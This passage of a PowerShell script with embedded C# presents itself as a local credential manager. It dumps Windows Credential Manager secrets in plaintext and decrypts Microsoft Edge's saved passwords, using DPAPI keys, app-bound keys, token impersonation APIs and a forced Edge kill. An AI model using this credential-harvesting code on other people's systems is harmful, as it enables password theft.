# Ensure required presentation framework assemblies are loaded
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===================================================================
# WINDOWS CREDENTIAL MANAGER - UNIFIED INTERFACE
# ===================================================================
# This script provides a unified UI for viewing Windows stored credentials from multiple sources:
#   1. Windows Credential Manager (CredRead/CredEnumerate)
#   2. PasswordVault (Windows.Security.Credentials)
#   3. Vault metadata (vaultcmd.exe parsing)
#   4. Additional credential metadata (cmdkey.exe parsing)
#
# IMPORTANT: Vault Password Encryption Notes
# -------------------------------------------
# Windows Vault files (.vcrd) contain encrypted credentials stored at:
#   C:\Users\<user>\AppData\Local\Microsoft\Vault\<VAULT_GUID>\*.vcrd
#
# About Control Panel (keymgr.dll):
# - Control Panel Credential Manager (keymgr.dll) imports RPC functions from RPCRT4.dll
# - It calls an UNDOCUMENTED RPC interface to VaultSvc (LocalSystem service on port 49664)
# - The RPC interface definition, UUID, and function signatures are NOT published
# - The RPC call likely passes vault credentials to VaultSvc which returns decrypted passwords
# - Reproducing this would require:
#   * RPC interface reverse-engineering (Wireshark / API Monitor)
#   * Discovering the interface UUID and function signatures
#   * Building an RPC client with proper marshaling
#   * Risk of breaking with future Windows updates
#
# These credentials CAN be accessed via:
#   a) Through CredRead/CredEnumerate (standard Windows Credential Manager)   [WORKS - standard creds only]
#   b) Through PasswordVault WinRT API                                        [WORKS - app-specific creds]
#   c) Through vaultcmd.exe metadata parsing                                  [WORKS - metadata with add / remove support, no passwords]
#   d) Through undocumented RPC to VaultSvc (what Control Panel uses)         [REQUIRES REVERSE-ENGINEERING]
#   e) Through direct file decryption (research feasible key recovery)        [THEORY - vault db decryption]
#
# Current Implementation:
#   - Web/Windows tabs show all Windows OS credentials accessible via standard documented APIs
#   - Diagnostics tab includes vaultcmd.exe metadata reference (read-only)
#   - This is the minimum achievable through basic API calls
#
# ===================================================================

# ==============================================
# 1. C# ENGINE (AGGREGATED FILTERS WITH DE-DUPLICATION + VAULT API)
# ==============================================
$SourceCode = @"
using Microsoft.Win32.SafeHandles;
using System;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Linq;
using System.Web.Script.Serialization;

public enum CredentialType : uint
{
    None = 0,
    Generic = 1,
    DomainPassword = 2,
    DomainCertificate = 3,
    DomainVisiblePassword = 4,
    GenericCertificate = 5,
    DomainExtended = 6,
    Maximum = 7,
    CredTypeMaximum = Maximum+1000
}

public enum PersistenceType : uint
{
    Session = 1,
    LocalComputer = 2,
    Enterprise = 3
}

public class Credential : IDisposable
{
    private string description;
    private DateTime lastWriteTime;
    private string password;
    private PersistenceType persistenceType;
    private string target;
    private CredentialType type;
    private string username;

    public Credential() { }

    public Credential(string username, string password, string target, CredentialType type)
    {
        Username = username;
        Password = password;
        Target = target;
        Type = type;
        PersistenceType = PersistenceType.Session;
        lastWriteTime = DateTime.MinValue;
    }

    // Constructor that directly loads from enumerated CREDENTIAL struct
    public Credential(SecurityEngineMatrix.CREDENTIAL enumCred)
    {
        LoadInternal(enumCred);
    }

    public string Username { get { return username; } set { username = value; } }
    public string Password { get { return password; } set { password = value; } }
    public string Target { get { return target; } set { target = value; } }
    public string Description { get { return description; } set { description = value; } }
    public DateTime LastWriteTime { get { return LastWriteTimeUtc.ToLocalTime(); } }
    public DateTime LastWriteTimeUtc { get { return lastWriteTime; } private set { lastWriteTime = value; } }
    public CredentialType Type { get { return type; } set { type = value; } }
    public PersistenceType PersistenceType { get { return persistenceType; } set { persistenceType = value; } }

    public void Dispose() { }

    public bool Load()
    {
        IntPtr credPointer;
        bool result = SecurityEngineMatrix.CredRead(Target, Type, 0, out credPointer);
        if (!result) 
        {
            // CredRead failed - this credential may not be readable or may have special handling
            // For now, we still create a partial credential object with what we have
            return false;
        }

        using (SecurityEngineMatrix.CriticalCredentialHandle credentialHandle = new SecurityEngineMatrix.CriticalCredentialHandle(credPointer))
        {
            LoadInternal(credentialHandle.GetCredential());
        }
        return true;
    }

    public static IEnumerable<Credential> LoadAll()
    {
        List<Credential> credlist = new List<Credential>();
        HashSet<string> seenTargets = new HashSet<string>();

        // Enumerate credentials by type prefix and unrestricted
        // This includes: generic, domain, MicrosoftAccount, WindowsLive, LegacyGeneric, etc.
        string[] filters = new string[] { 
            null,                       // All generic credentials
            "*",                        // Wildcard for all
            "MicrosoftAccount:*",       // Microsoft account credentials
            "WindowsLive:*",            // Windows Live credentials
            "LegacyGeneric:*",          // Legacy generic credentials
            "Domain:*"                  // Domain credentials
        };

        foreach (string filter in filters)
        {
            try
            {
                IEnumerable<SecurityEngineMatrix.CREDENTIAL> creds = SecurityEngineMatrix.CredEnumerate(filter);
                foreach (SecurityEngineMatrix.CREDENTIAL cred in creds)
                {
                    // Composite key ensures overlapping returns do not add duplicates
                    string uniqueKey = cred.TargetName + "||" + cred.Type + "||" + cred.UserName;
                    if (seenTargets.Contains(uniqueKey)) continue;

                    // Create credential directly from enumerated data
                    Credential fullCred = new Credential(cred);
                    credlist.Add(fullCred);
                    seenTargets.Add(uniqueKey);
                }
            }
            catch {}
        }
        return credlist;
    }

    internal void LoadInternal(SecurityEngineMatrix.CREDENTIAL credential)
    {
        Type = (CredentialType)credential.Type;
        Username = ((Type == CredentialType.DomainCertificate || Type == CredentialType.GenericCertificate) && !string.IsNullOrEmpty(credential.Comment))
            ? credential.Comment
            : credential.UserName;
        Password = SecurityEngineMatrix.ReadCredentialBlob(credential);
        Target = credential.TargetName;
        PersistenceType = (PersistenceType)credential.Persist;
        Description = credential.Comment;
        LastWriteTimeUtc = DateTime.FromFileTimeUtc(credential.LastWritten);
    }
}

public class SecurityEngineMatrix
{
    public enum CRED_MARSHAL_TYPE : int
    {
        CertCredential = 1,
        UsernameTargetCredential = 2,
        BinaryBlobCredential = 3,
        UsernameForPackedCredentials = 4
    }

    [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern bool CredRead(string target, CredentialType type, int reservedFlag, out IntPtr credentialPtr);

    [DllImport("Advapi32.dll", EntryPoint = "CredFree", SetLastError = true)]
    internal static extern void CredFree([In] IntPtr cred);

    [DllImport("Advapi32.dll", EntryPoint = "CredEnumerateW", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

    [DllImport("Advapi32.dll", EntryPoint = "CredWriteW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredWrite([In] ref CREDENTIAL credential, uint flags);

    [DllImport("Advapi32.dll", EntryPoint = "CredRestoreCredentials", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredRestoreCredentials(string file, byte[] password, int passwordSize, uint flags);

    [DllImport("Advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredDelete(string targetName, uint type, uint flags);

    [DllImport("Advapi32.dll", EntryPoint = "CredMarshalCredentialW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredMarshalCredential(CRED_MARSHAL_TYPE credType, ref CERT_CREDENTIAL_INFO credential, out IntPtr marshaledCredential);

    [StructLayout(LayoutKind.Sequential)]
    public struct CREDENTIAL
    {
        public int Flags;
        public int Type;
        [MarshalAs(UnmanagedType.LPWStr)] public string TargetName;
        [MarshalAs(UnmanagedType.LPWStr)] public string Comment;
        public long LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        [MarshalAs(UnmanagedType.LPWStr)] public string TargetAlias;
        [MarshalAs(UnmanagedType.LPWStr)] public string UserName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CERT_CREDENTIAL_INFO
    {
        public uint cbSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
        public byte[] rgbHashOfCert;
    }

    public class CredentialSnapshot
    {
        public string TargetName { get; set; }
        public string UserName { get; set; }
        public string Comment { get; set; }
        public int Type { get; set; }
        public int Persist { get; set; }
        public byte[] CredentialBlobBytes { get; set; }
        public string SecretText { get; set; }

        public string Key
        {
            get
            {
                return (TargetName ?? string.Empty) + "\u001f" + Type.ToString() + "\u001f" + (UserName ?? string.Empty);
            }
        }

        public string Fingerprint
        {
            get
            {
                return (Comment ?? string.Empty) + "\u001f" + Persist.ToString() + "\u001f" + Convert.ToBase64String(CredentialBlobBytes ?? new byte[0]);
            }
        }
    }

    public static string ReadCredentialBlob(CREDENTIAL credential)
    {
        if (credential.CredentialBlobSize <= 0 || credential.CredentialBlob == IntPtr.Zero)
            return null;

        try
        {
            CredentialType type = (CredentialType)credential.Type;
            if (type == CredentialType.DomainCertificate || type == CredentialType.GenericCertificate)
                return ReadCertificateThumbprint(credential.CredentialBlob, credential.CredentialBlobSize);

            byte[] blobBytes = new byte[credential.CredentialBlobSize];
            Marshal.Copy(credential.CredentialBlob, blobBytes, 0, blobBytes.Length);

            if ((blobBytes.Length % 2) != 0)
                return Convert.ToBase64String(blobBytes);

            return Encoding.Unicode.GetString(blobBytes).TrimEnd('\0');
        }
        catch
        {
            return null;
        }
    }

    private static string ReadCertificateThumbprint(IntPtr credentialBlob, int credentialBlobSize)
    {
        int expectedSize = Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO));
        if (credentialBlobSize < expectedSize)
            return null;

        CERT_CREDENTIAL_INFO certInfo = (CERT_CREDENTIAL_INFO)Marshal.PtrToStructure(credentialBlob, typeof(CERT_CREDENTIAL_INFO));
        if (certInfo.rgbHashOfCert == null || certInfo.rgbHashOfCert.Length != 20)
            return null;

        return BitConverter.ToString(certInfo.rgbHashOfCert).Replace("-", string.Empty);
    }

    public static string MarshalCertificateUsername(byte[] certificateHash)
    {
        if (certificateHash == null || certificateHash.Length != 20)
            throw new ArgumentException("Certificate hash must be exactly 20 bytes.", "certificateHash");

        CERT_CREDENTIAL_INFO certInfo = new CERT_CREDENTIAL_INFO
        {
            cbSize = (uint)Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO)),
            rgbHashOfCert = certificateHash
        };

        IntPtr marshaledCredential = IntPtr.Zero;
        try
        {
            if (!CredMarshalCredential(CRED_MARSHAL_TYPE.CertCredential, ref certInfo, out marshaledCredential) || marshaledCredential == IntPtr.Zero)
                throw new InvalidOperationException("CredMarshalCredential failed: " + Marshal.GetLastWin32Error());

            return Marshal.PtrToStringUni(marshaledCredential);
        }
        finally
        {
            if (marshaledCredential != IntPtr.Zero)
                CredFree(marshaledCredential);
        }
    }

    public static IEnumerable<CREDENTIAL> CredEnumerate(string filter)
    {
        int count;
        IntPtr pCredentials;
        // Use flag 1 (CRED_ENUMERATE_ALL_CREDENTIALS) to get all credentials including special/system ones
        bool ret = CredEnumerate(filter, 1, out count, out pCredentials);

        if (!ret || pCredentials == IntPtr.Zero)
            yield break;

        try
        {
            for (int n = 0; n < count; n++)
            {
                IntPtr credentialPtr = Marshal.ReadIntPtr(pCredentials, n * IntPtr.Size);
                yield return (CREDENTIAL)Marshal.PtrToStructure(credentialPtr, typeof(CREDENTIAL));
            }
        }
        finally
        {
            CredFree(pCredentials);
        }
    }

    public static List<CredentialSnapshot> CaptureCredentialSnapshots()
    {
        int count;
        IntPtr pCredentials;
        List<CredentialSnapshot> snapshots = new List<CredentialSnapshot>();
        bool ret = CredEnumerate(null, 1, out count, out pCredentials);

        if (!ret || pCredentials == IntPtr.Zero)
            return snapshots;

        try
        {
            for (int n = 0; n < count; n++)
            {
                IntPtr credentialPtr = Marshal.ReadIntPtr(pCredentials, n * IntPtr.Size);
                CREDENTIAL credential = (CREDENTIAL)Marshal.PtrToStructure(credentialPtr, typeof(CREDENTIAL));
                snapshots.Add(CreateSnapshot(credential));
            }
        }
        finally
        {
            CredFree(pCredentials);
        }

        return snapshots;
    }

    public static bool WriteSnapshot(CredentialSnapshot snapshot)
    {
        if (snapshot == null)
            throw new ArgumentNullException("snapshot");

        CREDENTIAL credential = new CREDENTIAL();
        credential.Type = snapshot.Type;
        credential.TargetName = snapshot.TargetName;
        credential.Comment = snapshot.Comment;
        credential.Persist = snapshot.Persist;
        credential.UserName = snapshot.UserName;
        credential.CredentialBlobSize = snapshot.CredentialBlobBytes != null ? snapshot.CredentialBlobBytes.Length : 0;

        IntPtr blobPointer = IntPtr.Zero;
        try
        {
            if (credential.CredentialBlobSize > 0)
            {
                blobPointer = Marshal.AllocCoTaskMem(credential.CredentialBlobSize);
                Marshal.Copy(snapshot.CredentialBlobBytes, 0, blobPointer, credential.CredentialBlobSize);
            }

            credential.CredentialBlob = blobPointer;
            return CredWrite(ref credential, 0);
        }
        finally
        {
            if (blobPointer != IntPtr.Zero)
                Marshal.FreeCoTaskMem(blobPointer);
        }
    }

    private static CredentialSnapshot CreateSnapshot(CREDENTIAL credential)
    {
        return new CredentialSnapshot
        {
            TargetName = credential.TargetName,
            UserName = credential.UserName,
            Comment = credential.Comment,
            Type = credential.Type,
            Persist = credential.Persist,
            CredentialBlobBytes = CopyCredentialBlob(credential.CredentialBlob, credential.CredentialBlobSize),
            SecretText = ReadCredentialBlob(credential)
        };
    }

    private static byte[] CopyCredentialBlob(IntPtr credentialBlob, int credentialBlobSize)
    {
        if (credentialBlob == IntPtr.Zero || credentialBlobSize <= 0)
            return new byte[0];

        byte[] blobBytes = new byte[credentialBlobSize];
        Marshal.Copy(credentialBlob, blobBytes, 0, blobBytes.Length);
        return blobBytes;
    }

    public sealed class CriticalCredentialHandle : CriticalHandleZeroOrMinusOneIsInvalid
    {
        public CriticalCredentialHandle(IntPtr preexistingHandle)
        {
            SetHandle(preexistingHandle);
        }

        public CREDENTIAL GetCredential()
        {
            if (!IsInvalid)
            {
                return (CREDENTIAL)Marshal.PtrToStructure(handle, typeof(CREDENTIAL));
            }
            throw new InvalidOperationException("Invalid CriticalHandle!");
        }

        protected override bool ReleaseHandle()
        {
            if (!IsInvalid)
            {
                CredFree(handle);
                SetHandleAsInvalid();
                return true;
            }
            return false;
        }
    }
}

// ------------------------------------------------------------------
// Microsoft Edge (Chromium) Diagnostics Engine
// Read-only profile discovery and Login Data enumeration via winsqlite3.dll
// ------------------------------------------------------------------
public class EdgeDiagnosticCredential
{
    public long LoginId { get; set; }
    public string ProfileName { get; set; }
    public string ProfileDirectory { get; set; }
    public string ProfilePath { get; set; }
    public string Website { get; set; }
    public string ActionUrl { get; set; }
    public string Username { get; set; }
    public string Password { get; set; }
    public string LastUsed { get; set; }
    public string EncryptionVersion { get; set; }
}

public class EdgeProfileInfo
{
    public string DirectoryName { get; set; }
    public string DisplayName { get; set; }
    public string ProfilePath { get; set; }
}

public static class EdgeDiagnosticsEngine
{
    private const int SQLITE_OK = 0;
    private const int SQLITE_ROW = 100;
    private const int SQLITE_DONE = 101;
    private static readonly IntPtr SQLITE_TRANSIENT = new IntPtr(-1);
    private const int TOKEN_QUERY = 0x0008;
    private const int TOKEN_DUPLICATE = 0x0002;
    private const int TOKEN_IMPERSONATE = 0x0004;
    private const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
    private const int SE_PRIVILEGE_ENABLED = 0x00000002;
    private const int PROCESS_QUERY_INFORMATION = 0x0400;
    private const int PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const int TH32CS_SNAPPROCESS = 0x00000002;
    private const int SECURITY_IMPERSONATION = 2;
    private const int TOKEN_TYPE_IMPERSONATION = 2;
    private const int ERROR_NOT_ALL_ASSIGNED = 1300;
    private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

    [StructLayout(LayoutKind.Sequential)]
    private struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID
    {
        public int LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public int PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct PROCESSENTRY32
    {
        public int dwSize;
        public int cntUsage;
        public int th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public int th32ModuleID;
        public int cntThreads;
        public int th32ParentProcessID;
        public int pcPriClassBase;
        public int dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    private sealed class EdgeLocalStateInfo
    {
        public Dictionary<string, string> ProfileDisplayNames = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        public byte[] MasterKey;
        public string MasterKeyError;
        public byte[] AppBoundKey;
        public string AppBoundKeyError;
    }

    private sealed class ProcessInfo
    {
        public string Name;
        public int ProcessId;
    }

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
    private static extern int sqlite3_open16(string filename, out IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_close(IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
    private static extern int sqlite3_prepare16_v2(IntPtr db, string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_reset(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_errmsg16(IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_text16(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern long sqlite3_column_int64(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_bind_int64(IntPtr stmt, int index, long value);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
    private static extern int sqlite3_bind_text16(IntPtr stmt, int index, string value, int lengthInBytes, IntPtr destructor);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_bind_blob(IntPtr stmt, int index, byte[] value, int length, IntPtr destructor);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptGetProperty(IntPtr hObject, string pszProperty, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptEncrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    [DllImport("crypt32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LocalFree(IntPtr hMem);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateToolhelp32Snapshot(int dwFlags, int th32ProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeValueW(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, int dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    public static string FindUserDataPath()
    {
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        if (string.IsNullOrEmpty(localAppData))
            return null;

        string path = Path.Combine(localAppData, "Microsoft", "Edge", "User Data");
        return Directory.Exists(path) ? path : null;
    }

    public static List<EdgeProfileInfo> ListProfiles()
    {
        List<EdgeProfileInfo> profiles = new List<EdgeProfileInfo>();
        string userDataPath = FindUserDataPath();
        if (string.IsNullOrEmpty(userDataPath))
            return profiles;

        EdgeLocalStateInfo localState = LoadLocalState(userDataPath);
        return ListProfiles(userDataPath, localState);
    }

    private static List<EdgeProfileInfo> ListProfiles(string userDataPath, EdgeLocalStateInfo localState)
    {
        List<EdgeProfileInfo> profiles = new List<EdgeProfileInfo>();

        string[] directories = Directory.GetDirectories(userDataPath);
        Array.Sort(directories, StringComparer.OrdinalIgnoreCase);

        foreach (string directory in directories)
        {
            string name = Path.GetFileName(directory);
            if (string.IsNullOrEmpty(name))
                continue;

            if (!string.Equals(name, "Default", StringComparison.OrdinalIgnoreCase)
                && !name.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
            {
                continue;
            }

            if (!File.Exists(Path.Combine(directory, "Login Data")))
                continue;

            profiles.Add(new EdgeProfileInfo
            {
                DirectoryName = name,
                DisplayName = GetProfileDisplayName(localState, name),
                ProfilePath = directory
            });
        }

        return profiles;
    }

    public static List<EdgeDiagnosticCredential> LoadDiagnostics()
    {
        List<EdgeDiagnosticCredential> credentials = new List<EdgeDiagnosticCredential>();
        string userDataPath = FindUserDataPath();
        if (string.IsNullOrEmpty(userDataPath))
            return credentials;

        EdgeLocalStateInfo localState = LoadLocalState(userDataPath);
        foreach (EdgeProfileInfo profile in ListProfiles(userDataPath, localState))
        {
            try
            {
                credentials.AddRange(ReadProfileCredentials(profile, localState));
            }
            catch (Exception ex)
            {
                credentials.Add(new EdgeDiagnosticCredential
                {
                    ProfileName = profile.DisplayName,
                    ProfileDirectory = profile.DirectoryName,
                    Website = "[Profile Read Error]",
                    Username = "-",
                    Password = ex.Message,
                    LastUsed = "-",
                    EncryptionVersion = "ERROR"
                });
            }
        }

        return credentials;
    }

    public static bool IsEdgeRunning()
    {
        try
        {
            return Process.GetProcessesByName("msedge").Length > 0;
        }
        catch
        {
            return false;
        }
    }

    public static void KillEdgeProcesses()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "taskkill.exe";
        startInfo.Arguments = "/F /IM msedge.exe /T";
        startInfo.CreateNoWindow = true;
        startInfo.UseShellExecute = false;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;

        using (Process process = Process.Start(startInfo))
        {
            if (process != null)
                process.WaitForExit();
        }
    }

    public static void UpdateCredential(long loginId, string profilePath, string username, string password)
    {
        if (loginId <= 0)
            throw new ArgumentOutOfRangeException("loginId");
        if (string.IsNullOrEmpty(profilePath))
            throw new ArgumentNullException("profilePath");

        string userDataPath = GetUserDataPathFromProfile(profilePath);
        EdgeLocalStateInfo localState = LoadLocalState(userDataPath);
        if (localState.MasterKey == null || localState.MasterKey.Length == 0)
            throw new InvalidOperationException(string.IsNullOrEmpty(localState.MasterKeyError) ? "Edge master key unavailable." : localState.MasterKeyError);

        byte[] encryptedPassword = EncryptPasswordV10(password ?? string.Empty, localState.MasterKey);
        ExecuteCredentialUpdate(profilePath, loginId, username ?? string.Empty, encryptedPassword);
    }

    public static void DeleteCredential(long loginId, string profilePath)
    {
        if (loginId <= 0)
            throw new ArgumentOutOfRangeException("loginId");
        if (string.IsNullOrEmpty(profilePath))
            throw new ArgumentNullException("profilePath");

        ExecuteCredentialDelete(profilePath, loginId);
    }

    private static List<EdgeDiagnosticCredential> ReadProfileCredentials(EdgeProfileInfo profile, EdgeLocalStateInfo localState)
    {
        List<EdgeDiagnosticCredential> credentials = new List<EdgeDiagnosticCredential>();
        string loginDataPath = Path.Combine(profile.ProfilePath, "Login Data");
        string tempPath = CreateTempCopyPath("cm_edge_login_", ".db");
        string tempWalPath = tempPath + "-wal";
        string tempShmPath = tempPath + "-shm";

        File.Copy(loginDataPath, tempPath, true);

        string sourceWalPath = loginDataPath + "-wal";
        if (File.Exists(sourceWalPath))
            File.Copy(sourceWalPath, tempWalPath, true);

        string sourceShmPath = loginDataPath + "-shm";
        if (File.Exists(sourceShmPath))
            File.Copy(sourceShmPath, tempShmPath, true);

        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        try
        {
            int openResult = sqlite3_open16(tempPath, out db);
            if (openResult != SQLITE_OK || db == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_open16 failed: " + GetSqliteError(db, openResult));

            string sql = "SELECT id, origin_url, action_url, username_value, password_value, date_last_used FROM logins ORDER BY origin_url ASC, username_value ASC";
            int prepareResult = sqlite3_prepare16_v2(db, sql, -1, out stmt, IntPtr.Zero);
            if (prepareResult != SQLITE_OK || stmt == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_prepare16_v2 failed: " + GetSqliteError(db, prepareResult));

            while (true)
            {
                int stepResult = sqlite3_step(stmt);
                if (stepResult == SQLITE_DONE)
                    break;

                if (stepResult != SQLITE_ROW)
                    throw new InvalidOperationException("sqlite3_step failed: " + GetSqliteError(db, stepResult));

                long loginId = sqlite3_column_int64(stmt, 0);
                string originUrl = GetColumnText(stmt, 1);
                string actionUrl = GetColumnText(stmt, 2);
                string username = GetColumnText(stmt, 3);
                byte[] passwordBlob = GetColumnBlob(stmt, 4);
                long dateLastUsed = sqlite3_column_int64(stmt, 5);

                credentials.Add(new EdgeDiagnosticCredential
                {
                    LoginId = loginId,
                    ProfileName = profile.DisplayName,
                    ProfileDirectory = profile.DirectoryName,
                    ProfilePath = profile.ProfilePath,
                    Website = !string.IsNullOrEmpty(originUrl) ? originUrl : actionUrl,
                    ActionUrl = actionUrl,
                    Username = username,
                    Password = DecryptPassword(passwordBlob, localState),
                    LastUsed = ChromeTimeToString(dateLastUsed),
